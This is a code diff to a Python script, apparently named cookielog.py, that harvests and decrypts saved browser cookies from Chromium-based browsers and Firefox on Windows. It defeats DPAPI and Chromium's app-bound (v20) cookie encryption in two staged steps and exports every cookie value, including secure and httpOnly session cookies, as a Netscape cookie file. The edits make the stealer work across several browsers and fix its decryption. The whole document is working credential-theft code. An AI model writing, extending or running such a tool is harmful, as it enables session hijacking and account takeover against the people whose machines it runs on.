@@ -14,7 +14,7 @@
 #   python cookielog.py --v20-usr   # stage 2, as user -> mc.key
 #
 # deps: pip install cryptography
-import argparse, base64, ctypes, ctypes.wintypes as W, glob, json, os, shutil, sqlite3, subprocess, sys, tempfile, time
+import argparse, base64, ctypes, ctypes.wintypes as W, glob, hashlib, json, os, shutil, sqlite3, subprocess, sys, tempfile, time
 
 try:
     from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
@@ -93,12 +93,19 @@ def rows(main, sql):
     finally: con.close()
 
 # ------------------------------------------------------------------ Chromium keys
-def v20_key():
-    p = os.path.join(STAGE, "mc.key")
-    if not os.path.exists(p): return None
-    with open(p, "rb") as f: return base64.b64decode(f.read())
+def v20_key(browser=None):
+    """Return the per-browser app-bound key, falling back to the legacy mc.key."""
+    names = []
+    if browser:
+        names.append(os.path.join(STAGE, f"mc-{browser}.key"))
+    names.append(os.path.join(STAGE, "mc.key"))
+    for p in names:
+        if os.path.exists(p):
+            with open(p, "rb") as f:
+                return base64.b64decode(f.read())
+    return None
 
-def chromium_keys(local_state):
+def chromium_keys(local_state, browser=None):
     ks = {}
     try:
         with open(local_state, encoding="utf-8") as f: oc = json.load(f).get("os_crypt", {})
@@ -109,36 +116,42 @@ def chromium_keys(local_state):
             ks[b"v10"] = ks[b"v11"] = dpapi(b[5:])                     # b"DPAPI" prefix
         except OSError:
             print(f"  [v10] user DPAPI failed at {local_state}", file=sys.stderr)
-    k = v20_key()
+    k = v20_key(browser)
     if k: ks[b"v20"] = k
     return ks
 
-def decrypt_value(key, enc):
+def decrypt_value(key, enc, host=None):
     raw = open_blob(key, enc[3:15], enc[15:])
-    # the 32-byte SHA256 prefix only exists in v20 cookies (app-bound);
-    # v10/v11 return the value directly — cutting 32 bytes corrupts the cookie
-    return raw[32:].decode("utf-8", "replace") if enc[:3] == b"v20" else raw.decode("utf-8", "replace")
+    # Chromium (>=118 for v20, >=130 for v10) prefixes cookies with
+    # SHA256(host_key) for domain binding. Verify the hash before stripping --
+    # v10/v11 on older profiles carry no prefix and must be returned as-is.
+    if host and len(raw) >= 32:
+        if raw[:32] == hashlib.sha256(host.encode("utf-8")).digest():
+            raw = raw[32:]
+    return raw.decode("utf-8", "replace")
 
 def dump_chromium(browser, root):
     out = []
     ls = os.path.join(root, "Local State")
     if not os.path.exists(ls): return out, []
-    keys = chromium_keys(ls)
+    keys = chromium_keys(ls, browser)
     for db in glob.glob(os.path.join(root, "*", "Network", "Cookies")) + \
             glob.glob(os.path.join(root, "*", "Cookies")):              # pre-88 has no Network\
-        prof = os.path.basename(os.path.dirname(os.path.dirname(db)))
+        parent = os.path.dirname(db)
+        prof = os.path.basename(os.path.dirname(parent)) if os.path.basename(parent) == "Network" \
+            else os.path.basename(parent)
         recs, tmp = rows(db, "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
                               "is_secure,is_httponly,samesite FROM cookies")
         for host, name, path, val, enc, exp, sec, http, samesite in recs:
             enc = bytes(enc or b"")
             if enc[:3] in keys:
-                try:    val = decrypt_value(keys[enc[:3]], enc)
+                try:    val = decrypt_value(keys[enc[:3]], enc, host)
                 except Exception: val = ""
             out.append(dict(browser=browser, profile=prof, domain=host, name=name,
                             path=path or "/", value=val,
-                            expires=int(exp / 1_000_000 - 11_644_473_600) if exp else 0,
+                            expires=int(exp // 1_000_000 - 11_644_473_600) if exp else 0,
                             secure=bool(sec), httpOnly=bool(http),
-                            sameSite={-1: "Lax", 1: "Strict", 2: "None"}.get(samesite, "Lax"),
+                            sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                             encrypted=bool(enc)))
         shutil.rmtree(tmp, ignore_errors=True)
     return out, list(keys)
@@ -152,7 +165,7 @@ def dump_firefox():
         for name, val, host, path, exp, sec, http, samesite in recs:
             out.append(dict(browser="firefox", profile=prof, domain=host, name=name, path=path or "/",
                             value=val, expires=exp or 0, secure=bool(sec), httpOnly=bool(http),
-                            sameSite={0: "default", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
+                            sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                             encrypted=False))
         shutil.rmtree(tmp, ignore_errors=True)
     return out
@@ -161,9 +174,12 @@ def dump_firefox():
 def netscape(cookies):
     lines = ["# Netscape HTTP Cookie File"]
     for c in cookies:
-        dom = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
-        lines.append("\t".join([dom, "TRUE", c["path"], "TRUE" if c["secure"] else "FALSE",
-                                str(c["expires"]), c["name"], c["value"]]))
+        dom = c.get("domain") or ""
+        dom = dom if dom.startswith(".") else "." + dom
+        exp = int(c.get("expires", c.get("expirationDate", 0)) or 0)
+        lines.append("\t".join([dom, "TRUE", c.get("path") or "/",
+                                "TRUE" if c.get("secure") else "FALSE",
+                                str(exp), c.get("name") or "", c.get("value") or ""]))
     return "\n".join(lines) + "\n"
 
 def harvest(only):
@@ -251,7 +267,10 @@ def stage_v20(a):
         with open(f, "rb") as fh: wrapped = dpapi(fh.read())           # layer 2: USER DPAPI
         flag = wrapped[0]                                              # 1 = AES-GCM, other = ChaCha20
         key = open_blob_flag(flag, ELEV_AES, wrapped[1:13], wrapped[13:])
-        with open(os.path.join(STAGE, "mc.key"), "wb") as f: f.write(base64.b64encode(key))
+        enc = base64.b64encode(key)
+        with open(os.path.join(STAGE, f"mc-{name}.key"), "wb") as f: f.write(enc)
+        # legacy single file: only meaningful when one browser is in play
+        with open(os.path.join(STAGE, "mc.key"), "wb") as f: f.write(enc)
         got += 1
     print("stage 2 ok: mc.key generated" if got else "nothing to do in stage 2")
 
